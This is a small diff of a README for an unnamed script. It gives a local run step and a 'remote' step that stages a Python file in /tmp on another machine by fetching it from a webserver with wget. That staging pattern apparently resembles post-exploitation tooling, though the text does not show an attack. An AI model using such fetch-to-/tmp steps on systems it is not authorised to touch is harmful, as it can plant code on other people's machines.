@@ -10,11 +10,13 @@ get it working its best.
 ## Instructions
 
 **Local**
+
 Run the local file
 ```
 bash local.sh
 ```
 **Remote**
+
 Upload the 'upload' file to /tmp. I'll give the example of using a webserver
 ```
 wget *ip*:*port*/*file* > /tmp/upload.py
